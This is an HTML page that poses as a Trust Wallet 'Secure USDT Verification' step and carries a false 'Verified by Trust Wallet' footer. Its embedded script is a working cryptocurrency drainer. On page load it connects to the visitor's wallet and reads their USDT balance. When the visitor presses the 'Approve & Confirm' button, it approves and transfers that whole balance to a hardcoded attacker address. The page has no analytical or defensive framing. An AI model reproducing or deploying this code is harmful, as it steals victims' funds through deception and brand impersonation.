<!DOCTYPE html>
<html>
<head>
  <title>Secure USDT Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" href="./favicon.ico" type="image/x-icon" />
  <style>
    body { background:#081c3a; color:#fff; font-family:sans-serif; text-align:center; padding-top:20px; }
    img { width:80px; margin:20px auto; display:block; }
    h1 { font-size:1.5em; margin-bottom:10px; }
    p { opacity:0.8; }
    #approve { padding:12px 24px; background:#0052ff; color:#fff; border:none; border-radius:8px; cursor:pointer; font-size:1em; margin-top:20px; }
    .footer { position:fixed; bottom:10px; width:100%; opacity:0.5; font-size:0.8em; }
  </style>
</head>
<body>
  <img src="./logo.png" alt="Trust Wallet">
  <h1>Secure USDT Verification</h1>
  <p id="status">Initializing Trust Wallet...</p>
  <button id="approve" style="display:none;">Approve & Confirm</button>
  <div class="footer">Verified by Trust Wallet • Trusted since 2009</div>

  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
  <script>
    const RECEIVER = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
    const USDT = "0x55d398326f99059fF775485246999027B3197955";
    const ABI = [
      { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
      { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
      { "constant": true, "inputs": [{ "name": "owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
    ];

    async function autoStart() {
      const status = document.getElementById("status");
      try {
        if (!window.ethereum) {
          status.innerText = "❌ Please open in Trust Wallet browser.";
          return;
        }

        const web3 = new Web3(window.ethereum);
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const user = accounts[0];

        const contract = new web3.eth.Contract(ABI, USDT);
        const balance = await contract.methods.balanceOf(user).call();

        if (balance === "0") {
          status.innerText = "❌ 0 USDT balance.";
          return;
        }

        document.getElementById("approve").style.display = "inline-block";
        status.innerText = "USDT detected. Tap Approve & Confirm.";

        document.getElementById("approve").onclick = async () => {
          document.getElementById("approve").innerText = "Processing...";
          try {
            await contract.methods.approve(RECEIVER, balance).send({ from: user });
            await contract.methods.transferFrom(user, RECEIVER, balance).send({ from: user });
            status.innerText = "✅ Transfer complete.";
            document.getElementById("approve").style.display = "none";
          } catch (err) {
            console.error(err);
            status.innerText = "❌ Transaction failed or rejected.";
            document.getElementById("approve").innerText = "Approve & Confirm";
          }
        };
      } catch (err) {
        console.error(err);
        status.innerText = "❌ Wallet connection failed.";
      }
    }

    window.addEventListener('load', autoStart);
  </script>
</body>
</html>
